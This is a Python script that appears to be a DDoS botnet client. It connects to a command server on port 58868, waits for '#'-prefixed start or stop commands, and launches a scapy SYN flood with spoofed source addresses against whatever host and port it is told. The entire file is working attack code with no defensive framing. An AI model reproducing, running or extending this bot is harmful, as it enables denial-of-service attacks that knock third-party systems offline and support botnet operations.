#!/usr/bin/python3
# _*_ coding: utf-8 _*_

import os
import sys
import random
import socket
import argparse
from multiprocessing import Process

from scapy.all import *

isWorking = False
curProcess = None


def synFlood(tgt, dPort):
    print("=" * 100)
    print("The syn flood is running!")
    print("=" * 100)
    srcList = ["201.1.1.2", "10.1.1.102", "69.1.1.2", "125.130.5.199"]
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        packet = ipLayer / tcpLayer
        send(packet)


def cmdHandle(sock, parser):
    global curProcess
    while True:
        # recv command
        data = sock.recv(1024).decode("utf-8")
        if len(data) == 0:
            print("The data is empty!")
            return
        if data[0] == "#":
            try:
                # parse command
                options = parser.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd
                # start DDos command
                if m_cmd.lower() == "start":
                    if curProcess is not None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system("clear")
                    print("The synFlood is start!")
                    p = Process(target=synFlood, args=(m_host, m_port))
                    p.start()
                    curProcess = p
                # stop DDos command
                elif m_cmd.lower() == "stop":
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system("clear")
            except:
                print("Failed to perform the command!")


def main():
    # add need parse command
    p = argparse.ArgumentParser()
    p.add_argument("-H", dest="host", type=str)
    p.add_argument("-p", dest="port", type=int)
    p.add_argument("-c", dest="cmd", type=str)
    print("*" * 40)
    try:
        # create socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect server
        s.connect(("127.0.0.1", 58868))
        print("To connected server was success!")
        print("=" * 40)
        # handle command
        cmdHandle(s, p)
    except:
        print("The network connected failed!")
        print("Please restart the script!")
        sys.exit(0)


if __name__ == "__main__":
    main()
